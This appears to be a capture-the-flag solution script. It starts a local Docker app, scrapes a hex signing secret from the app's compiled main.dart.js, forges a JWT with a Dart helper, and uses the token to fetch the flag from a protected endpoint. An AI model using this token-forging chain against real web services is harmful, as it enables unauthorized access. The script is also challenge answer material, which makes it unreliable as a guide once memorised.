#!/bin/bash

docker compose up -d
sleep 5

secret=$(curl -s 'http://localhost:3000/main.dart.js' | grep -o '"[0-9a-f]\{64\}"' | tail -1 | tr -d '"')
jwt=$(dart run _solution/jwt.dart $secret)

curl -s -H "Authorization: Bearer $jwt" http://localhost:3000/api/flag | egrep -o 'flag{.*?}'

docker compose down